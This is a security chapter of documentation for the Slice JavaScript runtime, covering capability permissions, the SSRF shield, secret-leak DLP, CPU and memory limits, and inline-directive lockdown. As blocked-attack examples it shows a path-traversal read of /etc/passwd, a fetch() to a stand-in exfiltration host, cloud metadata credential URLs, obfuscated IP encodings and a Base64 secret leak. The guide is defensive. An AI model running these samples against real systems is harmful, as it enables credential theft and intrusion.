# Chapter 04: Zero-Trust Security Guide: OCap Permissions, Fuel Limits, SSRF Shield & Egress DLP

In Node.js and Bun, every `npm` package you install and every script you run inherits **100% of your OS user's permissions**: it can read `~/.ssh/id_rsa`, modify `Object.prototype`, open sockets to AWS/GCP cloud metadata (`169.254.169.254`), exfiltrate `process.env` secrets, or lock up a CPU core with `while (true) {}`. Even Deno's CLI flags (`--allow-read`, `--allow-net`) apply to the **entire OS process**, not to individual HTTP requests or plugins inside the same process.

**Slice enforces MicroVM-grade Zero-Trust security per isolate and per HTTP request**, using five concentric rings of defense:

| Ring | Defense Layer | What It Protects Against | Violation Error (`SandboxViolation`) |
| :--- | :--- | :--- | :--- |
| **Ring 1** | **SES Intrinsic Lockdown** | Prototype pollution (`Object.prototype.polluted = true`) across shared realms | `IntrinsicMutationBlocked` |
| **Ring 2** | **OCap Filesystem & Subprocess Tokens (`FsCap` & `ExecCap`)** | Unauthorized file read/write, `..` traversal, & unlisted subprocess execution | `FsReadDenied` / `FsWriteDenied` / `ExecDenied` |
| **Ring 3** | **OCap Network & Env Tokens (`NetCap` & `EnvCap`)** | Unauthorized outbound `fetch()` & `process.env` / `env()` credential harvesting | `NetAccessDenied` / `EnvAccessDenied` |
| **Ring 4** | **Deterministic CPU Fuel, Memory & Checkpoint Cage** | Infinite loop CPU DoS (`while(true){}`), heap/KV exhaustion, & checkpoint abuse | `CpuFuelExhausted` / `MemoryCeilingExceeded` |
| **Ring 5** | **Cloud Metadata SSRF Shield, Egress Secret DLP & Hardware MPK** | `169.254.169.254` SSRF, Base64/raw secret exfiltration, & cross-tenant memory access | `SSRF_METADATA_BLOCKED` / `EGRESS_SECRET_LEAK_BLOCKED` |

This chapter shows you how to configure and test every security control in your applications.

---

## 1. Zero Ambient Authority by Default

When you run a script with `slice run script.ts` (without a `slice.toml` or `--allow-*` flags), the isolate spawns with **`CapabilityToken::pure_compute()`**:
- **Filesystem (`node:fs`):** `0` readable paths, `0` writable paths.
- **Network (`fetch`, WebSockets, Sockets):** `0` allowed outbound hosts.
- **Subprocesses (`node:child_process`):** `0` allowed binaries (`allow_exec = []`, Deny-All).
- **Environment (`env()` / `process.env`):** Only `NODE_ENV="production"` is exposed; host OS environment variables (such as `AWS_SECRET_ACCESS_KEY` or `GITHUB_TOKEN`) are **never** leaked into the isolate unless explicitly granted.

---

## 2. Controlling Filesystem Access (`allow_read` & `allow_write`)

You can grant path-prefix read and write capabilities in `slice.toml`, via top-of-file inline directives (`// @slice-allow-read: [...]`), via `SLICE_ALLOW_READ` / `SLICE_ALLOW_WRITE` environment variables, via CLI flags, or per sub-sandbox in `Slice.evalSandbox()`.

### 2.1 Via `slice.toml`
```toml
[capabilities]
allow_read = ["/app/public", "/app/config", "/tmp/cache"]
allow_write = ["/tmp/cache"]
```

### 2.2 Via CLI Flags
```bash
slice run ./src/pipeline.ts --allow-read=/app/public --allow-read=/tmp/cache --allow-write=/tmp/cache
```

### 2.3 Path Traversal (`..`), NUL Byte & Device/UNC Blocking
Every `node:fs` function (`readFileSync`, `writeFileSync`, `appendFileSync`, `existsSync`, `mkdirSync`, `readdirSync`, `statSync`, `renameSync`, `unlinkSync`, `rmSync`, `symlinkSync`, `chmodSync`) normalizes path separators and **unconditionally rejects any path containing `..`, NUL bytes (`\0`), Win32 device namespaces (`\\.\`), or UNC network shares (`\\server\share`)**.
For example, if you grant `--allow-read=/app/public`, an attacker attempting:
```typescript
import * as fs from "node:fs";
fs.readFileSync("/app/public/../../etc/passwd", "utf8");
```
is immediately blocked with:
```text
OCap Violation: Compartment 'cli-tenant' lacks filesystem read authority for '/app/public/../../etc/passwd'
```

### 2.4 Copy-on-Write VFS Mutations (Host Disk Preservation)
Even when `allow_write` is granted for a directory, `writeFileSync`, `appendFileSync`, `copyFileSync`, `renameSync`, `unlinkSync`, `rmSync`, and `openSync`/`writeSync` operate strictly inside the isolate's inode-backed in-memory copy-on-write VFS (`BOA_VFS_STATE`). Unlinking or removing a path records a VFS tombstone that masks any underlying host entry inside the isolate without deleting files from the host OS disk (keeping unlinked open file descriptors readable/writable until `closeSync`), and `Slice.checkpoint()` / `Slice.restore()` rolls VFS inodes, open FDs, tombstones, and memory budget accounting back in `< 5 us`.

---

## 3. Controlling Outbound Network Access (`allow_net`) & The Built-In SSRF Shield

Outbound `fetch()` and `Slice.fetchSync()` calls are guarded by two layers: your **OCap Host Allowlist (`allow_net`)** and Slice's **Cloud Metadata & Private CIDR SSRF Firewall**.

### 3.1 Explicit Host Allowlisting (Recommended for Production)
Grant only the exact `hostname:port` (or `hostname`, which automatically permits `:80` and `:443`) that your service needs to call:

```toml
[capabilities]
allow_net = [
    "api.stripe.com:443",
    "api.openai.com:443",
    "127.0.0.1:18095"
]
```
Or via CLI:
```bash
slice run ./src/webhook.ts --allow-net=api.stripe.com:443,127.0.0.1:18095
```
If your code (or a compromised npm dependency) tries to call `await fetch("https://evil-collector.org/steal")`, Slice blocks the request before DNS resolution and traps with `NetAccessDenied`.

### 3.2 Wildcard Public Internet (`allow_net = ["*"]`) & Automatic SSRF Protection
What if you are building a webhook delivery worker or an AI browsing agent that needs to `fetch()` arbitrary user-supplied public URLs (`--allow-net=*`)?

In Node.js, Bun, or Deno (`deno run --allow-net`), if a user passes `http://169.254.169.254/latest/meta-data/iam/security-credentials/` or `http://10.0.0.15:6379/`, your server will happily fetch your cloud instance's IAM credentials or internal Redis server (Server-Side Request Forgery / SSRF).

**In Slice, the SSRF Shield is always active across every DNS resolution and redirect hop:**
1. **Cloud Metadata Endpoints Are Unconditionally Blocked (Even Under `--allow-net=*`):**
   - `169.254.169.254` (AWS EC2 / GCP / Azure IMDS)
   - `169.254.170.2` (AWS ECS Task Metadata)
   - `100.100.100.200` (Alibaba Cloud Metadata)
   - `[fd00:ec2::254]` (IPv6 AWS IMDS)
   - `metadata.google.internal` & `metadata.goog` (GCP Metadata DNS)
2. **Pre-Connect DNS Resolved-IP Firewall (`resolve_and_verify_socket_addrs`):**
   - Before opening any TCP or TLS socket, Slice resolves the hostname and inspects **every returned `SocketAddr` (both IPv4 and IPv6, including IPv4-mapped IPv6 addresses like `::ffff:127.0.0.1` and `::ffff:169.254.169.254`)**.
   - Even if an attacker configures a public DNS domain (`evil.example.com`) with an `A` or `AAAA` record pointing to `127.0.0.1`, `10.0.0.1`, or `169.254.169.254` (DNS rebinding), Slice blocks the connection before `connect()` and traps with `SSRF_DNS_REBIND_BLOCKED` / `SSRF_METADATA_IP_BLOCKED`.
   - Internal/private endpoints can **only** be reached if you explicitly name that exact `host:port` in `allow_net` (e.g., `--allow-net=*,127.0.0.1:18095`).
3. **Zero-Trust Hop-by-Hop Redirect Guard (`301` / `302` / `303` / `307` / `308`):**
   - When an allowed upstream server returns a `30x` redirect (`redirect: "follow"`), Slice re-verifies the target `Location` URL's host, port, and DNS-resolved IP against `allow_net` and the SSRF firewall **before following the hop** (up to 5 hops).
   - If a redirect crosses origins (different scheme, host, or port), Slice automatically strips sensitive `Authorization`, `Cookie`, and `Proxy-Authorization` headers so credentials are never leaked to a redirect target.
   - Supports `redirect: "follow"` (default), `redirect: "manual"` (returns the `30x` response with its `location` header), and `redirect: "error"`.

---

## 4. Environment Variables (`allow_env`), `.env` Auto-DLP & Outbound Egress DLP (`--audit-egress`)

### 4.1 Granting Specific Environment Variables
You can inject specific `KEY=VALUE` pairs (or import specific keys from your host shell) via `slice.toml` or `--allow-env`:

```bash
# Inject explicit key=value
slice run ./src/index.ts --allow-env=STAGE=production --allow-env=REGION=eu-west-1

# Or pass --allow-env=MY_HOST_VAR to copy MY_HOST_VAR from the host OS environment
export MY_HOST_VAR="hello"
slice run ./src/index.ts --allow-env=MY_HOST_VAR
```

Inside your TypeScript code:
- `process.env.STAGE` returns `"production"`.
- `env("STAGE")` returns `"production"`, whereas calling `env("UNDECLARED_KEY")` immediately traps with `SandboxViolation::EnvAccessDenied`.

### 4.2 Blocking Secret Exfiltration with `--audit-egress` & Auto-DLP `.env`
When your application or AI agent needs a secret key (such as `STRIPE_SECRET_KEY` or `OPENAI_API_TOKEN`) to sign a request, how do you guarantee that a bug or prompt injection never leaks that secret into:
- `console.log()` / `stdout`
- HTTP response bodies or Server-Sent Events (`Response.sse`)
- Outbound `fetch()` URLs, headers, or `POST` bodies - even if the attacker encodes the secret in **Base64** or **Base64URL**?

You have two ways to enable Slice's **Egress Data Loss Prevention (DLP) Firewall**:

1. **Automatic `.env` DLP (`--env-file=.env` or `env_file = ".env"` in `slice.toml`):**
   - Create a `.env` file:
     ```dotenv
     SERVICE_NAME=checkout-api
     PUBLIC_KEY_ID="pk_live_public_9001"
     STRIPE_SECRET_KEY="sk_live_super_secret_stripe_key"
     DB_MASTER_PASSWORD="pg_prod_password_998877"
     ```
   - When loaded via `--env-file=.env`, Slice automatically classifies `STRIPE_SECRET_KEY` and `DB_MASTER_PASSWORD` as sensitive (because their names match `*_SECRET*`, `*_TOKEN*`, `*_KEY*`, `*_PASSWORD*`, or `*_PRIVATE*`, while ignoring `PUBLIC_KEY*` and `PUBLISHABLE_KEY*`) and registers their raw, Base64, and Base64URL forms into the Egress DLP guard!
2. **Explicit `--audit-egress=<secret|auto>` & `--audit-egress-file=<path>` Flags:**
   ```bash
   # Register an explicit secret string
   slice serve ./src/server.ts --audit-egress="sk_live_super_secret_stripe_key"

   # Auto-discover sensitive keys from .env and granted environment variables without treating "auto" as a literal secret
   slice run ./src/agent.ts --audit-egress=auto

   # Load newline-delimited secrets (or KEY=VALUE entries) from a dedicated secrets file (fails closed if missing/unreadable)
   slice serve ./src/server.ts --audit-egress-file=./secrets.txt
   ```
   All security and configuration file flags (`--audit-egress-file`, `--env-file`, `--config`, `--trace`, `slice.toml` `env_file`, and trusted `// @slice-env-file`) accept both `--flag=<value>` and `--flag <value>` forms and **fail closed** with an explicit error if the target file is missing, unreadable, invalid UTF-8, or given an empty value.

### Example: Seeing Egress DLP Catch a Base64 Secret Leak
```typescript
// Suppose --audit-egress="sk_live_99887766" is active:
const leakedBase64 = Buffer.from("sk_live_99887766", "utf8").toString("base64");

// Attempting to print, fetch(), or ws.send() the Base64-encoded secret immediately traps!
console.log("Diagnostic trace:", leakedBase64);
// -> Traps with: OCap Violation: Compartment '...' lacks environment variable authority for 'EGRESS_SECRET_LEAK_BLOCKED'
```

### 4.3 Hardened HTTP/1.1 & RFC 6455 WebSocket Wire-Protocol Defenses
Both the outbound `fetch()` / `WebSocket` client engine and the inbound `slice serve` HTTP/WebSocket server enforce strict wire-level security guards:
- **Non-Canonical IP & Special-Use CIDR SSRF Blocking:** Under wildcard `allow_net = ["*"]`, the SSRF shield blocks octal (`0177.0.0.1`), hexadecimal (`0x7f.0.0.1`), integer/dword (`2130706433`), shorthand (`127.1`, `169.254.43518`), and percent-encoded (`%31%36%39...`) IPv4 encodings alongside `0.0.0.0/8`, RFC 1918, loopback, link-local (`169.254.0.0/16`, `fe80::/10`), CGNAT (`100.64.0.0/10`), benchmark (`198.18.0.0/15`), IETF protocol (`192.0.0.0/24`), multicast (`224.0.0.0/4`, `ff00::/8`), IPv6 Unique Local (`fc00::/7`), NAT64 (`64:ff9b::/96`, `64:ff9b:1::/48`), SIIT (`::ffff:0:0/96`), and Teredo (`2001:0000::/32`) ranges.
- **RFC 9110 `tchar` Header & CRLF Injection Prevention:** Outbound and inbound header names are validated against a compile-time RFC 9110 `tchar` lookup table, and header values / request targets reject `\r`, `\n`, `\0`, and ASCII control characters to prevent HTTP Request/Response Splitting.
- **RFC 9112 Request Smuggling (`CL.TE` / `TE.CL`) & Chunked Arithmetic Guards:** `slice serve` immediately rejects requests containing both `Transfer-Encoding` and `Content-Length` or conflicting duplicate `Content-Length` headers with `400 Bad Request` (`Connection: close`), validates chunked hex sizes with checked arithmetic, and caps inbound bodies at `4 MB` (`413 Payload Too Large`) and headers at 64 fields / 64 KB (`431 Request Header Fields Too Large`).
- **Tenant-Partitioned Keep-Alive Pool & Outbound Memory Ceilings:** Warm Keep-Alive sockets are keyed by `(tenant_id, is_https, host_port)` so tenants never share an upstream connection, and outbound HTTP responses (`64 KB` max headers, `16 MB` max body) and WebSocket frames (`4 MB` max) are strictly bounded by the active tenant's remaining memory budget (`SandboxViolation::MemoryCeilingExceeded`).

### 4.4 5-Ring OCap Subprocess Containment (`node:child_process`, `allow_exec` & `--allow-exec`)
When CLI tools or AI Code-Mode agents use `node:child_process` (`execFileSync`, `spawnSync`, `execSync`, `spawn`, `exec`, `execFile`), Slice enforces all 5 security rings:
1. **Ring 1 - OCap `ExecCap` Binary Allowlist (`allow_exec` / `--allow-exec`):** Deny-All by default (`allowed_exec_binaries: []`). Any attempt to execute a binary not explicitly granted via `--allow-exec=/usr/bin/git`, `SLICE_ALLOW_EXEC=/usr/bin/git`, or `[capabilities] allow_exec = ["/usr/bin/git"]` in `slice.toml` (or attempting path spoofing such as `/tmp/evil/git` when `/usr/bin/git` is granted) immediately traps with `SandboxViolation::ExecDenied`.
2. **Ring 2 - Environment Sanitization (`env_clear()`):** Spawned child processes **never** inherit the host OS `std::env::vars()`; they receive only the active tenant's attenuated `allowed_env_keys`.
3. **Ring 3 - Child Stdio Output Egress DLP:** Both `stdout` and `stderr` produced by a child process are scanned by `verify_egress_secrets_slice` (raw, Base64, and Base64URL forms of `--audit-egress` and `.env` Auto-DLP secrets) before returning to JavaScript (`EGRESS_SECRET_LEAK_BLOCKED`).
4. **Ring 4 - Execution Timeout & `maxBuffer` Ceiling:** Enforces hard execution timeouts (killing timed-out subprocesses) and `maxBuffer` byte ceilings.
5. **Ring 5 - CPU Fuel, Memory Accounting & Sub-Isolate Attenuation:** Subprocess output bytes are charged against the tenant's fuel and memory budgets, and `Slice.evalSandbox(code, { allowExec: [...] })` / `new Worker(url, { slice: { allowExec: [...] } })` enforce strict subset attenuation (`child.allowExec` intersected with `parent.allowExec`).

---

## 5. Deterministic CPU Fuel, Byte-Level Memory & Checkpoint Cages (`--fuel`, `--memory`, `--no-checkpoints`, `--max-checkpoints`)

Wall-clock timeouts (`setTimeout`) are unreliable for multi-tenant sandboxing because CPU load spikes cause false timeouts while still allowing an attacker to burn 100% of a CPU core for milliseconds.

Slice meters **deterministic CPU instruction fuel**, **per-tenant memory bytes**, and **guest checkpoint quotas**:

### 5.1 Setting Fuel, Memory, and Checkpoint Limits
In `slice.toml`:
```toml
[limits]
fuel = 5_000_000     # Max CPU instructions per execution / HTTP request
memory_kb = 4096     # Max 4 MB memory ceiling per tenant isolate

[capabilities]
allow_checkpoints = true
max_checkpoints = 8  # Bound guest Slice.checkpoint() snapshots (default max: 64)
```
Or on the CLI:
```bash
# Bound fuel, memory, and guest checkpoint count:
slice run ./untrusted_plugin.ts --fuel=100000 --memory=1048576 --max-checkpoints=4

# Or disable guest Slice.checkpoint() / Slice.restore() calls completely:
slice run ./untrusted_plugin.ts --no-checkpoints
```

### 5.2 What Happens When a Limit Is Exceeded
- **Infinite Loop / CPU DoS (`while (true) {}`):** Preempted deterministically on the exact instruction that exceeds `fuel`, returning `SandboxViolation::CpuFuelExhausted` (or `HTTP 403 Forbidden` in `slice serve`) while all other worker threads and tenants continue unaffected.
- **Memory Exhaustion (`Slice.kv` / allocations / buffers):** Any `Slice.kv.set(key, val)` / `Slice.kv.incr(key)`, WebAssembly linear memory page growth, array/string expansion, or compartment allocation that pushes `memory_used_bytes` past `memory_limit_bytes` traps immediately with `SandboxViolation::MemoryCeilingExceeded`.
- **Checkpoint Quota Enforcement:** If guest code calls `Slice.checkpoint()` when `--no-checkpoints` is set or after reaching `--max-checkpoints=<N>`, Slice blocks the unauthorized snapshot call immediately.

---

## 6. Untrusted Entrypoint & AI Code-Mode Directive Lockdown (`// @slice-*`, `--trust-directives` & `--no-directives`)

When running AI-generated scripts, user-submitted plugins, or downloaded snippets via `slice run <script.ts>`, an attacker or hallucinating LLM might place top-of-file inline source directives (`// @slice-allow-read: ["/"]`, `// @slice-allow-net: ["*"]`, `// @slice-allow-exec: ["/bin/sh"]`, `// @slice-env-file: .env`, `// @slice-fuel: 999999999999`) at the top of the file in an attempt to self-grant permissions.

**Slice prevents inline directive privilege escalation by default (`trust_directives = false`):**
1. **Default Monotonic Attenuation (`trust_directives = false`):**
   - **Resource & Checkpoint Limits (`// @slice-fuel`, `// @slice-memory-kb`, `// @slice-memory-mb`, `// @slice-checkpoints`, `// @slice-max-checkpoints`):** Clamped via `.min(...)` (and boolean AND for checkpoints) so an inline directive can only **reduce** (tighten) the host's configured CPU fuel, memory ceiling, or checkpoint quota, never raise it.
   - **Filesystem, Network & Subprocess Capabilities (`// @slice-allow-read`, `// @slice-allow-write`, `// @slice-allow-net`, `// @slice-allow-exec`):** Strictly intersected against the capabilities already granted by `slice.toml`, `SLICE_*` environment variables, or CLI flags. If the host granted zero read paths or zero exec binaries, inline directives result in zero read paths and zero exec binaries.
   - **Environment Variables & `.env` Files (`// @slice-allow-env`, `// @slice-env-file`):** `// @slice-env-file` is ignored unless `trust_directives` is enabled, and `// @slice-allow-env` only permits keys already granted by the host.
   - **Outbound Egress DLP (`// @slice-audit-egress`):** Always additive - a script can always register *additional* secrets to block from leaking.
   - **Server Listener Settings (`// @slice-port`, `// @slice-workers`, `// @slice-tls-cert`, `// @slice-tls-key`):** Ignored unless `trust_directives` is enabled.
2. **Nested Sub-Sandboxes (`Slice.evalSandbox`) & `slice mcp` (`slice_eval_ts`):**
   - `Slice.evalSandbox(code, opts)` and the MCP `slice_eval_ts` tool **never** apply capability-granting or limit-raising `// @slice-*` directives from `code`; child capabilities are determined exclusively by `parent_caps` intersected with `opts`.
3. **Explicit Opt-In (`--trust-directives`) & Complete Directive Stripping (`--no-directives`):**
   - When writing trusted single-file local utility scripts (`#!/usr/bin/env slice`) where you intentionally want top-of-file `// @slice-allow-*` comments to grant permissions without a separate `slice.toml`, opt in via `--trust-directives`, `SLICE_TRUST_DIRECTIVES=1`, or `[capabilities] trust_directives = true` in `slice.toml` (pass `--no-trust-directives` to explicitly enforce default attenuation).
   - Passing `--no-directives` (or `--untrusted`) ignores all `// @slice-*` comments completely (even narrowing directives).

---

## 7. Auditing Your Environment (`slice verify-security`)

You can verify that all 5 security rings are active on your machine at any time by running:
```bash
slice verify-security
```
Output:
```text
[Slice Security Verifier] Executing 5 multi-tenant attack vectors...
  [PASS] Vector 1: SES Intrinsic Lockdown blocked Object.prototype pollution
  [PASS] Vector 2: OCap VFS Token blocked unauthorized /etc/shadow read
  [PASS] Vector 3: OCap Network Token blocked unauthorized evil.com exfiltration
  [PASS] Vector 4: OCap Env Token blocked unauthorized AWS_SECRET_ACCESS_KEY read
  [PASS] Vector 5: Deterministic Fuel Cage preempted while(true) DoS loop
Result: 5/5 Attack Vectors Deterministically Contained.
```
